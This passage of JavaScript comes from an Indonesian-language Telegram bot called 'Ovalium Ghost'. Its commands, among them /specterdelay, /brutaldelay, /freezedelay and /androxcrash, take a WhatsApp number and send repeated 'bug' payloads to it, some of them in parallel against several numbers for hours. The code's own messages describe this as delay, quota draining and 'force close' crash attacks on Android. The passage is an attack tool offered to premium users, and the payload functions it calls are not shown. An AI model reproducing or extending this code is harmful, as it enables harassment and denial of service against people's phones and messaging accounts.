      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  
    if (!isCmdEnabled("twinsdelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
    

    // Owner bypass
    if (ctx.from.id == ownerID) {
      // skip
    } else {
      if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
      }

      const allowed = loadAllowedGroups();
      if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
      }
    }

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /twinsdelay 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";


    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
     
    const commandUsed = ctx.message.text;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    const groupId = ctx.chat.type !== "private" ? ctx.chat.id : "-";
    const groupName = ctx.chat.type !== "private" ? ctx.chat.title : "-";

    await ctx.telegram.sendMessage(
      ownerID,
      `📢 <b>COMMAND DIJALANKAN</b>

👤 <b>User :</b> ${userTag}
🆔 <b>User ID :</b> <code>${userId}</code>

💬 <b>Command :</b> <code>${commandUsed}</code>
⏱️ <b>Waktu :</b> ${now}

🏠 <b>ID Grup :</b> <code>${groupId}</code>
📛 <b>Nama Grup :</b> ${groupName}
`,
      { parse_mode: "HTML" }
    );

    // ==========================

    const processMessage = await ctx.reply(
      `✅ SUKSES KIRIM BUG KE TARGET <code>${q}</code>`,
      { parse_mode: "HTML" }
    );

    const processMessageId = processMessage.message_id;

     await AllFunctionDelayv2(sock, target);
     await antiSpamDelay(); 

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processMessageId,
      undefined,
      `✅ <b>Delay Berhasil Dikirim!</b>\n\n<b>Target:</b> ${q}\n<i>Eksekusi MAJESTIC DELAY selesai.</i>`,
      { parse_mode: "HTML" }
    );
  }
);

bot.command(
  "specterdelay",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
  
  const userId = ctx.from.id;
    const isOwner = userId == ownerID;
  
  if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  
    if (!isCmdEnabled("specterdelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
    // ======================
    // 🔐 ACCESS CONTROL
    // ======================
    if (ctx.from.id == ownerID) {
      // Owner bypass
    } else {
      if (ctx.chat.type === "private") {
        return ctx.reply("⛔ Akses ditolak. Hanya tersedia di grup yang diizinkan.");
      }
      const allowed = loadAllowedGroups();
      if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("🔒 Grup ini tidak memiliki izin akses.");
      }
    }

    // ======================
    // 📥 PARAMETER VALIDATION
    // ======================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("📋 Format: <code>/specterdelay 62×××</code>", { parse_mode: "HTML" });

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ======================
    // 📊 LOGGING SYSTEM
    // ======================
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
     
    const commandUsed = ctx.message.text;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const groupId = ctx.chat.type !== "private" ? ctx.chat.id : "-";
    const groupName = ctx.chat.type !== "private" ? ctx.chat.title : "-";

    await ctx.telegram.sendMessage(
      ownerID,
      `OVALIUM GHOST SPECTER

👤 *Executor*: ${userTag}
🆔 *User ID*: \`${userId}\`
💬 *Command*: \`${commandUsed}\`
⏰ *Time*: ${now}
📍 *Group*: ${groupName}
📱 *Target*: \`${q}\`

▸ *Status*: \`PROCESSING\``,
      { parse_mode: "Markdown" }
    );

    // ======================
    // 🚀 INITIALIZATION MESSAGE
    // ======================
    await ctx.reply(
      `\`\`\`js
OVALIUM GHOST
SPECTER DELAY MODE

Target : ${q}
Status : PROCESSING
Node   : ACTIVE
\`\`\``,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "🔍 CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
          ]]
        }
      }
    );

    for (let i = 0; i < 15; i++) {              
      await LittleFunnyMURBUG(target);
      await MsgAudioxxx(sock, target);
      await antiSpamDelay(); 
    }

    // ======================
    // ✅ COMPLETION MESSAGE
    // ======================
    await ctx.reply(
      `\`\`\`js
OVALIUM GHOST
SPECTER DELAY MODE

Target : ${q}
Status : SUCCESS
Node   : COMPLETED

[ OPERATION FINISHED ]
Time : ${new Date().toLocaleTimeString()}
\`\`\``,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "🔍 CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
          ]]
        }
      }
    );
  }
);

bot.command(
  "spamxdelay",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    // 1️⃣ DEFINISIKAN VARIABEL DI PALING ATAS
    const userId = ctx.from.id;
    const isOwner = userId == ownerID; // Pastikan ownerID sudah terbaca dari config

    // ==========================================
    // 🚧 SYSTEM: WAJIB JOIN CHANNEL (KECUALI OWNER)
    // ==========================================
    if (!isOwner) {
      try {
        const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
        
        if (chatMember.status === "left" || chatMember.status === "kicked") {
          const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
          
          return ctx.reply(
            `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah.`,
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "📢 Join Channel", url: autoLink, style: "danger" }]
                ]
              }
            }
          );
        }
      } catch (error) {
        console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
      }
    }

    // ======================
    // 🚦 CEK STATUS COMMAND
    // ======================
    if (!isCmdEnabled("spamxdelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }

    // ======================
    // 🔐 ACCESS CONTROL
    // ======================
    if (isOwner) {
      // Owner bypass
    } else {
      if (ctx.chat.type === "private") {
        return ctx.reply("⛔ Akses ditolak. Hanya tersedia di grup yang diizinkan.");
      }
      const allowed = loadAllowedGroups();
      if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("🔒 Grup ini tidak memiliki izin akses, Lakukan /addgroup terlebih dahulu");
      }
    }
    
     

    // ======================
    // 📥 PARAMETER VALIDATION
    // ======================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("📋 Format: <code>/spamxdelay 62×××</code>", { parse_mode: "HTML" });

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ======================
    // 📊 LOGGING SYSTEM - HTML
    // ======================
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
    const commandUsed = ctx.message.text;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const groupId = ctx.chat.type !== "private" ? ctx.chat.id : "-";
    const groupName = ctx.chat.type !== "private" ? ctx.chat.title : "-";

    await ctx.telegram.sendMessage(
      ownerID,
      `<b>SPAMXDELAY EXECUTED</b>

👤 <b>Executor</b>: ${userTag}
🆔 <b>User ID</b>: <code>${userId}</code>
💬 <b>Command</b>: <code>${commandUsed}</code>
⏰ <b>Time</b>: ${now}
📍 <b>Group</b>: ${groupName}
📱 <b>Target</b>: <code>${q}</code>

▸ <b>Status</b>: <code>PROCESSING</code>`,
      { parse_mode: "HTML" }
    );

    // ======================
    // 🚀 INITIALIZATION MESSAGE
    // ======================
    await ctx.reply(
      `<b>Ovalium Ghost</b>\nBug terkirim: ${q}`,
      { 
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "Success" }
          ]]
        }
      }
    );

    for (let i = 0; i < 2; i++) {              
      await LittleFunnyMURBUG(target);
      await MsgAudioxxx(sock, target);
    await antiSpamDelay(); 
    }
  }
);


bot.command(
  "majesticdelay",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
  
  const userId = ctx.from.id;
    const isOwner = userId == ownerID;
  
  if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  
       if (!isCmdEnabled("majesticdelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
    // ======================
    // 🔐 ACCESS CONTROL
    // ======================
    if (ctx.from.id == ownerID) {
      // Owner bypass
    } else {
      if (ctx.chat.type === "private") {
        return ctx.reply("⛔ Akses ditolak. Hanya tersedia di grup yang diizinkan.");
      }
      const allowed = loadAllowedGroups();
      if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("🔒 Grup ini tidak memiliki izin akses.");
      }
    }

    // ======================
    // 📥 PARAMETER VALIDATION
    // ======================
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("📋 Format: <code>/majesticdelay 62×××</code>", { parse_mode: "HTML" });

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ======================
    // 📊 LOGGING SYSTEM
    // ======================
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
     
    const commandUsed = ctx.message.text;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const groupId = ctx.chat.type !== "private" ? ctx.chat.id : "-";
    const groupName = ctx.chat.type !== "private" ? ctx.chat.title : "-";

    await ctx.telegram.sendMessage(
      ownerID,
      `MAJESTIC DELAY INITIATED

👤 *Executor*: ${userTag}
🆔 *User ID*: \`${userId}\`
💬 *Command*: \`${commandUsed}\`
⏰ *Time*: ${now}
📍 *Group*: ${groupName}
📱 *Target*: \`${q}\`

▸ *Status*: \`PROCESSING\``,
      { parse_mode: "Markdown" }
    );

    // ======================
    // 🚀 INITIALIZATION MESSAGE
    // ======================
    await ctx.reply(
      `\`\`\`js
MAJESTIC DELAY PROTOCOL

Target : ${q}
Status : PROCESSING
Node   : ACTIVE
\`\`\``,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "🔍 CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
          ]]
        }
      }
    );

    for (let i = 0; i < 5; i++) {       
      await LittleFunnyMURBUG(target);     
      await MsgAudioxxx(sock, target); 
      await suspendDelay(target); 
      await antiSpamDelay(); 
      await sleep(1000);
    }

    // ======================
    // ✅ COMPLETION MESSAGE
    // ======================
    await ctx.reply(
      `\`\`\`js
MAJESTIC DELAY PROTOCOL

Target : ${q}
Status : SUCCESS
Node   : COMPLETED
Cycles : 15/15

[ OPERATION FINISHED ]
Time : ${new Date().toLocaleTimeString()}
\`\`\``,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "🔍 CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
          ]]
        }
      }
    );
  }
);

bot.command("brutaldelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

      if (!isCmdEnabled("brutaldelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
// Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /brutaldelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: DELAY
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

   for (let i = 0; i < 10; i++) {   
    await LittleFunnyMURBUG(target);      
    await MsgAudioxxx(sock, target);
    await sleep(1000);
  }
   

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining Quota Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("quantumdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

      if (!isCmdEnabled("quantumdelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
// Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /quantumdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  await ctx.telegram.sendMessage(
      ownerID,
      `📢 <b>COMMAND DIJALANKAN</b>

👤 <b>User :</b> ${userTag}
🆔 <b>User ID :</b> <code>${userId}</code>

💬 <b>Command :</b> <code>${commandUsed}</code>
⏱️ <b>Waktu :</b> ${now}

🏠 <b>ID Grup :</b> <code>${groupId}</code>
📛 <b>Nama Grup :</b> ${groupName}
`,
      { parse_mode: "HTML" }
    );

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type:  Delay
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {   
    await LittleFunnyMURBUG(target);      
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("freezedelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

      if (!isCmdEnabled("freezedelay")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
  try {
    if (!menuEnabled)
      return ctx.reply("⚠️ Script disebar Seseorang — Script telah dinonaktifkan.");
    if (!tokenValidated) return;

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 2)
      return ctx.reply("⚙️ Format salah!\nGunakan:\n/freezedelay 628xxxx 628xxxx ... 1");

    const durasiJam = parseFloat(args[args.length - 1]);
    const targets = args.slice(0, -1);

    if (isNaN(durasiJam))
      return ctx.reply("⚠️ Masukkan durasi di akhir (contoh: /freezedelay 628xxxx 1)");

    const waktuAkhir = Date.now() + durasiJam * 60 * 60 * 1000;

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<blockquote><pre>⬡═―—⊱ OVALIUM GHOST  ⊰―—═⬡
⌑ Total Target: ${targets.length}
⌑ Durasi: ${durasiJam} Jam
⌑ Type: Multi Invisible Combo
⌑ Status: Process...</pre></blockquote>`,
      parse_mode: "HTML"
    });

    const processEachTarget = async (targetNumber) => {
      const target = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
      while (Date.now() < waktuAkhir) {      
        await MediaInvis(target);    
    await Focav(sock, target);
    await Focav(sock, target);
    await Focav(sock, target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await Ghostluc(target);
    await xparams(target);
    await MediaInvis(target);
    await Ghostluc(target);
    await MediaInvis(target);
    await xparams(target);
    await xparams(target);
    await MediaInvis(target);
    await MediaInvis(target);
    await xparams(target);
    await Focav(sock, target);
    await MediaInvis(target);
    await xparams(target);
    await sleep(10000);
      }
    };

    // Jalankan semua target secara paralel
    await Promise.all(targets.map(num => processEachTarget(num)));

    await ctx.replyWithHTML(`
<blockquote><pre>⬡═―—⊱ OVALIUM GHOST  ⊰―—═⬡
⌑ Type: Multi Invisible Combo
⌑ Durasi: ${durasiJam} Jam
⌑ Status: Selesai — Semua Target Terkirim</pre></blockquote>`);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menjalankan proses multi target.");
  }
});

bot.command(
  "delayfull",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    if (!tokenValidated) return;

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Format: /delayfull 62×××");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const mention = true;

    // Kirim pesan awal proses
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Sticker Delay Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET", url: `https://wa.me/${q}` }]],
      },
    });

    const processMessageId = processMessage.message_id;
    const speed = 50; // <-- pastikan kamu definisikan variabel speed di sini

    for (let i = 0; i < speed; i++) {
      try {
        // Jalankan semua fungsi secara paralel
        await Promise.all([          
          MediaInvis(target),
          xparams(target),
        ]);
      } catch (err) {
        console.error("Error during batch execution:", err);
      }

      const batchIndex = Math.floor(i / 20);

      const baseDelay = 4000;
      const increasePerBatch = 2000;
      const maxDelay = 40000;

      let currentDelay = baseDelay + batchIndex * increasePerBatch;
      if (currentDelay > maxDelay) currentDelay = maxDelay;

      // Delay tiap batch
      await new Promise((resolve) => setTimeout(resolve, currentDelay));

      if ((i + 1) % 60 === 0) {
        console.log(
          `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai — delay ${(currentDelay / 1000).toFixed(1)}s (max ${maxDelay / 1000
          }s), istirahat 2 menit...`
        );
        await new Promise((resolve) => setTimeout(resolve, 2 * 60 * 1000));
      }
    }

    // Update caption setelah selesai
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `
<blockquote><pre>⬡═―—⊱ ⎧ OVALIUM GHOST ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Delay Hard
⌑ Status: ✅ Success
╘═——————————————═⬡</pre></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK TARGET", url: `https://wa.me/${q}` }]],
        },
      }
    );
  }
);

bot.command("androxcrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }

      if (!isCmdEnabled("androxcrash")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
  if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
  } else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
      return ctx.reply("Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
      return ctx.reply("Grup ini tidak memiliki akses.");
    }
  }
  
  if (!tokenValidated) {
    return;
  }
  
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Format: /androxcrash 62×××");
  
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // Notify owner sebelum eksekusi
  try {
    await ctx.telegram.sendMessage(ownerID, `
<blockquote><pre>
OWNER NOTIFICATION
═══════════════════

User ID    : ${ctx.from.id}
Username   : ${ctx.from.username || 'N/A'}
Chat ID    : ${ctx.chat.id}
Chat Type  : ${ctx.chat.type}
Target     : ${q}
Command    : /androxcrash
Time       : ${new Date().toLocaleString()}

Force close attack initiated
</pre></blockquote>`, {
      parse_mode: "HTML"
    });
  } catch (error) {
    console.error("Gagal mengirim notifikasi ke owner:", error);
  }

  // Proses message tanpa photo
  const processMessage = await ctx.reply(`
<blockquote><pre>
OVALIUM FORCE CLOSE SYSTEM

Target     : ${q}
Type       : Invisible Force Close
Platform   : Android
Status     : Processing Attack

Cant Spam Bug 
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  await AllFunctionCrash2(sock, target);
  await antiSpamDelay();

  // Notify owner setelah eksekusi berhasil
  try {
    await ctx.telegram.sendMessage(ownerID, `
<blockquote><pre>
OWNER NOTIFICATION
═══════════════════

User ID    : ${ctx.from.id}
Username   : ${ctx.from.username || 'N/A'}
Chat ID    : ${ctx.chat.id}
Target     : ${q}
Command    : /androxcrash
Status     : SUCCESS
Time       : ${new Date().toLocaleString()}

Force close attack completed
Target: ${q}
</pre></blockquote>`, {
      parse_mode: "HTML"
    });
  } catch (error) {
    console.error("Gagal mengirim notifikasi sukses ke owner:", error);
  }

  // Edit message setelah proses selesai
  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
OVALIUM FORCE CLOSE SYSTEM

Target     : ${q}
Type       : Invisible Force Close
Platform   : Android
Status     : Attack Success

Spam force close attack completed
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xinvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

const userId = ctx.from.id;
    const isOwner = userId == ownerID;

if (!isOwner) {
    try {
      const chatMember = await ctx.telegram.getChatMember(channelUsername, userId);
      
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        // Otomatis bikin link dari username (Misal: @chanelch jadi https://t.me/chanelch)
        const autoLink = `https://t.me/${channelUsername.replace("@", "")}`;
        
        return ctx.reply(
          `⚠️ *AKSES DITOLAK*\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel  kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "📢 Join Channel", url: autoLink, style:"danger" }]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log("Gagal cek status member (Pastikan bot jadi Admin di channel):", error);
    }
  }
  
  
  if (!isCmdEnabled("xinvis")) {
      return ctx.reply("⚠️ <b>MAAF!</b> Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "HTML" });
    }
  // Owner boleh selalu menggunakan command ini
if (ctx.from.id == ownerID) {
    // lewati pengecekan allowed group
} else {
    // Jika chat private, user biasa tidak boleh pakai
    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Bot hanya bisa digunakan di grup yang memiliki akses.");
    }

    // Jika chat adalah grup, cek apakah grup di allowed list
    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini tidak memiliki akses.");
    }
}
if (!tokenValidated) {
        return;
    }
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xinvis 62×××`);
